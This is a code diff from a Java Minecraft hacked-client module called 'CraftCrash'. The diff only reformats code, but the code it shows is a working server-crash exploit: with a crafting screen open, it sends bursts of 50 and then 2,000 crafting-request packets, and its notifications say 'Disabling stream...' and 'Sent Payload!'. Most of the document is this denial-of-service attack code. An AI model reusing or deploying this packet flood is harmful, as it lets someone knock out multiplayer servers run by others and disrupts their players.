@@ -53,16 +53,16 @@ public class CraftCrash extends Module {
         if (client.currentScreen instanceof CraftingScreen && !isListening) {
             ticks++;
             int sync = client.player.currentScreenHandler.syncId;
-            if(ticks % 15 == 0){
+            if (ticks % 15 == 0) {
                 Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Disabling stream...");
-                for(int i = 0; i < 50; i++){
+                for (int i = 0; i < 50; i++) {
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                 }
             }
-            if(ticks % 75 == 0){
+            if (ticks % 75 == 0) {
                 Notification.create(1000, "CraftCrash", Notification.Type.SUCCESS, "Sent Payload!");
-                for(int i = 0; i < 2000; i++){
+                for (int i = 0; i < 2000; i++) {
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, stick, true));
                     client.player.networkHandler.sendPacket(new CraftRequestC2SPacket(sync, buton, true));
                 }
